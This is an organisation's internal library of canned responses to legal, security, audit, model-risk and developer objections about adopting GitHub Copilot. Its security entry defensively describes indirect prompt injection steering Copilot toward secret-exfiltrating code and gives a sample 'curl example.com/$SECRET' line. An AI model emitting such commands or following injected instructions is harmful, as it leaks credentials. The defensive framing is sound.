# Canonical objection responses

Pre-built responses to the recurring Copilot / AI dev tooling objections from legal, security, audit, model risk, and skeptical developers. Each response has 5 parts: acknowledge the concern, what the org does, source, what's NOT covered, escalation path.

Last bulk-verified 2026-06-20.

---

## legal-ip-modified-suggestion

```yaml
id: legal-ip-modified-suggestion
audience: legal
objection_patterns:
  - "what if the developer modifies the suggestion"
  - "Copilot indemnity only covers unmodified suggestions"
  - "IP indemnity scope"
steel_manned_concern: |
  GitHub's IP indemnity covers suggestions accepted with the public code filter on, but
  developers routinely modify suggestions before merging. The concern: if the modification
  preserves the part that's substantially similar to public code, has the developer
  inadvertently moved the IP risk back to the org?
what_the_org_does: |
  Three controls in combination:
  1. Public code filter enforced at org level (non-optional; required for indemnity to apply).
  2. Internal secure-coding standards require dev review of any non-trivial Copilot suggestion
     against the org's allowed-licenses list, not just the public code filter.
  3. License compliance scanning (via dependency review + planned `license-compliance-checker` skill)
     catches downstream license obligations that suggestion-level review might miss.
source: |
  GitHub Copilot Business responsible-use docs +
  vault/facts/copilot/ip-indemnity.md (canonical FAQ entry).
not_covered: |
  - If a developer turns the public code filter OFF (which org policy disallows), indemnity does
    NOT apply for that session. This is an org policy boundary, not a Copilot product limit.
  - Indemnity does NOT cover code the developer writes themselves that happens to resemble
    public code — that's a general-counsel question, not a Copilot question.
escalation: |
  For specific high-stakes situations (e.g., a contributor with significant prior OSS exposure
  on a sensitive codebase), legal can request an exception process review via [[exception-request-drafter]].
```

---

## security-prompt-injection-context

```yaml
id: security-prompt-injection-context
audience: security
objection_patterns:
  - "prompt injection in Copilot context"
  - "what if our codebase contains injected instructions"
  - "indirect prompt injection in code completion"
steel_manned_concern: |
  Modern Copilot pulls context from open files, the repo, and (in some modes) from project
  knowledge bases. If any of those sources contain attacker-crafted content (perhaps from a
  vulnerable dependency, an untrusted MCP server, or a malicious commit), the model could be
  prompted to generate code that exfiltrates secrets, opens vulnerabilities, or violates org policy.
  This is the OWASP LLM01:2025 risk surface.
what_the_org_does: |
  Four-layer defense:
  1. Content exclusion at org and repo level keeps high-sensitivity paths out of context (per
     [[2026-06-20-data-residency-and-fedramp]] research).
  2. Secret scanning + push protection catches the worst exfiltration outcomes (a generated
     `curl example.com/$SECRET` won't push to remote).
  3. Standard PR review process — Copilot suggestions follow the same code-review controls as
     human-written code. CODEOWNERS / branch protection catches anomalous patterns.
  4. Periodic adversarial testing — sample codebases are deliberately seeded with injection
     patterns and the team reviews whether Copilot generates suspicious output.
source: |
  vault/research/github/2026-06-20-actions-hardening-post-shai-hulud.md (related supply-chain
  attack pattern). OWASP LLM01:2025. GitHub Copilot trust center.
not_covered: |
  - Prompt injection from MCP servers (if/when the org enables custom MCP) requires additional
    review per server. No org-wide control yet.
  - "Knowledge base" features in Copilot Chat that point at private docs need separate
    review of the docs' integrity before enablement.
escalation: |
  For specific high-risk repos (regulated-data handling, public-facing services), security
  architecture can review whether Copilot's context-window scope should be additionally
  restricted via repo-level content exclusion.
```

---

## audit-per-suggestion-traceability

```yaml
id: audit-per-suggestion-traceability
audience: audit
objection_patterns:
  - "per-suggestion audit trail"
  - "Copilot doesn't log what suggestions were accepted"
  - "SOX evidence for AI-assisted code"
  - "traceability of Copilot output"
steel_manned_concern: |
  SOX ITGC requires auditable evidence of code changes. Copilot suggestions are surfaces
  inside the developer's IDE, not central log records. If a regulator asks "show me which
  lines in this regulated service were AI-generated," we cannot answer at the per-line level.
what_the_org_does: |
  Reframe the evidence model:
  1. Copilot is a **tool used by developers**, like an IDE plugin. SOX ITGC controls apply at
     the human-developer + PR-review + change-management level, not the keystroke level. This is
     consistent with how the org treats IntelliSense, Spell-check, or any other dev assistant.
  2. Org-level audit log captures admin policy changes (who turned content exclusion on/off,
     who enabled which models, license assignments) — that IS auditable per
     [[2026-06-20-weekly-intelligence-digest]] item on Copilot audit log S3 export.
  3. Usage metrics API gives aggregate per-user activity (active users, AI credits used,
     acceptance rate) — supports trend monitoring and outlier detection.
  4. PR-level controls are the audit boundary: every accepted suggestion went through a PR
     reviewed by CODEOWNERS-designated humans. That's the SOX evidence.
source: |
  vault/facts/copilot/audit-log-export-format.md (pending memory-curator promotion).
  GitHub Docs on audit log + Copilot usage metrics API.
not_covered: |
  - Per-keystroke audit trail does NOT exist and (per GitHub's data-handling policy) cannot
    be enabled. Don't promise auditors this; reframe to PR-level evidence.
  - If an audit specifically asks "was this code Copilot-generated?", the honest answer is
    "we treat Copilot suggestions as developer authorship after acceptance; the per-suggestion
    source is not tracked."
escalation: |
  If a specific auditor or regulator demands per-suggestion tracking, that's an escalation to
  legal + GitHub account team — not a Copilot configuration question. Open question whether
  the forthcoming OCC + FRB + FDIC genAI RFI will surface this expectation
  (see [[2026-06-20-occ-frb-fdic-ai-posture-mid-2026]]).
```

---

## mrm-srt-11-7-fit

```yaml
id: mrm-sr-11-7-fit
audience: model-risk
objection_patterns:
  - "is Copilot a model under SR 11-7"
  - "do we need MRM for Copilot"
  - "model risk management for generative AI"
  - "Copilot model validation"
steel_manned_concern: |
  SR 11-7 (and its successor, OCC Bulletin 2026-13) requires model validation, performance
  monitoring, and governance for "models" used in banking. The concern: Copilot is an AI model;
  doesn't it fall under MRM? If yes, the org's MRM program needs to absorb dev-tool oversight,
  which it's not currently structured for.
what_the_org_does: |
  The interagency MRM guidance revised April 2026 (OCC Bulletin 2026-13) **explicitly excludes
  generative AI and agentic AI from scope**. This was a deliberate carve-out by the agencies
  pending a separate RFI. Copilot is therefore NOT governed by MRM; it's governed by:
  1. **Third-Party Risk Management** (TPRM) — the 2023 Interagency TPRM Guidance. Copilot has a
     TPRM file like any other vendor relationship.
  2. **IT general controls** (SOX ITGC) — per the audit-traceability response above.
  3. **Information security policy** — the org's standard cyber controls (data residency,
     content exclusion, secret scanning) apply.
source: |
  vault/research/regulator/2026-06-20-occ-frb-fdic-ai-posture-mid-2026.md — full breakdown
  of the MRM exclusion and the forthcoming RFI signal.
  Sullivan & Cromwell memo on revised MRM guidance.
not_covered: |
  - The exclusion has a built-in expiration: a forthcoming OCC + FRB + FDIC RFI is expected on
    generative AI in banking. When it lands, the org's posture may need to evolve. Track via
    `financial-regulator-watch`.
  - The exclusion does NOT clear Copilot from supervisory attention generally — it just clears
    it from the MRM-specific framework. Examiners can still review under cyber, TPRM, or general
    soundness lenses.
escalation: |
  The org's chief model risk officer should be aware of the exclusion AND the forthcoming RFI.
  Worth a one-page brief during the next MRM committee meeting using the
  [[2026-06-20-occ-frb-fdic-ai-posture-mid-2026]] research as the reference.
```

---

## skeptical-dev-quality

```yaml
id: skeptical-dev-quality
audience: skeptical-dev
objection_patterns:
  - "Copilot generates bad code"
  - "Copilot makes developers worse"
  - "junior developers will lean on Copilot and not learn"
  - "AI-generated code is lower quality"
steel_manned_concern: |
  Concrete developer concerns, often raised by senior engineers: (a) Copilot's outputs have
  real defects (hallucinated APIs, wrong dependencies, subtle correctness bugs); (b) developers
  who lean on Copilot don't internalize the codebase or develop debugging intuition; (c) the
  acceptance-rate metric incentivizes accepting wrong-but-plausible suggestions; (d) junior
  developers especially are at risk of skill atrophy.
what_the_org_does: |
  Reframe Copilot adoption as **augmentation, not replacement**:
  1. Copilot is enabled, not mandated. Per [[2026-06-20-adopt-obsidian-and-ob1-patterns]]'s
     thinking + Cutler's "AI and Agency" position (see [[2026-06-20-voices-watcher]] digest),
     enforced mandates undermine the discovery that makes AI tools valuable.
  2. PR review process is unchanged: every Copilot suggestion goes through the same code-review
     bar as human-written code. The acceptance rate is a usage metric, not a quality metric.
  3. Internal training emphasizes "Copilot as a fast brainstormer, not a fact source" — call
     out the hallucinated-API failure mode in onboarding so developers know what to watch for.
  4. Specifically for junior developers: pair Copilot training with explicit "why this suggestion
     would be wrong" exercises. Avoid the trap of treating Copilot as an oracle.
source: |
  John Cutler — "AI and Agency" (vault/digests/daily/2026-06-20-voices-watcher.md)
  Pawel Huryn — Fable 5 evaluation (same digest) — shows the rigor a credible AI eval requires.
not_covered: |
  - We don't currently have an internal metric for "code-quality delta from Copilot
    introduction." If you want one, the planned `copilot-metrics-analyzer` skill will surface
    candidates (defect-injection-rate, time-to-merge, post-merge bug rate by author).
  - No comprehensive answer to skill-atrophy concerns — this is partly cultural and partly an
    open research question across the industry.
escalation: |
  Senior engineers with specific quality concerns about specific code patterns should file an
  exception via [[exception-request-drafter]] (planned) or directly via the secure-coding
  standards working group. Don't dismiss the concern — surface it as input to the rollout
  process, where it improves the standards rather than slowing adoption.
```

---

## skeptical-dev-data-leakage

```yaml
id: skeptical-dev-data-leakage
audience: skeptical-dev
objection_patterns:
  - "Copilot is sending my code to OpenAI"
  - "where does my code go"
  - "is my code used to train other people's Copilot"
steel_manned_concern: |
  Developers — especially security-conscious ones — sometimes hold an outdated mental model of
  free-tier Copilot where prompts are used for training. The actual situation has changed but
  the concern persists; dismissing it is the wrong move.
what_the_org_does: |
  Pull from the [[copilot-faq-answerer]] canonical `data-handling` entry:
  - GitHub Copilot Business / Enterprise does NOT use customer prompts or suggestions for training.
  - Prompts are sent to GitHub's inference infrastructure for the duration of generating a
    suggestion; not retained.
  - The org's tenant is on Enterprise + data residency (US), so inference happens within US
    boundaries (per [[2026-06-20-data-residency-and-fedramp]]).
source: |
  vault/facts/copilot/data-handling.md (canonical).
  vault/research/copilot/2026-06-20-data-residency-and-fedramp.md.
not_covered: |
  - Free-tier Copilot (Individual) DOES have different data handling. The org's tenant isn't
    using it, but a developer's personal account would be. Worth surfacing: don't sign in to
    Copilot with a personal account on a corp workstation.
  - Content exclusion has limits: a path matching the exclude pattern won't be sent as
    *context*, but a developer who pastes excluded content into Copilot Chat directly bypasses
    the path-level control.
escalation: |
  Specific high-trust developers concerned about specific scenarios can request a one-on-one
  walk-through of the data flow with security architecture. This is usually the right answer
  for security-engineering hires recently joined from companies with stricter postures.
```

---

## Adding new entries

When a new objection appears in the wild:

1. Steel-man the concern in writing — what's the objector actually worried about, in their own framing?
2. Identify the org's actual control (the response should reflect what we DO, not what GitHub markets).
3. Pull source citations from `vault/facts/`, `vault/research/`, or GitHub Docs.
4. Identify what the response does NOT cover.
5. Set the escalation path.
6. Add to this file.
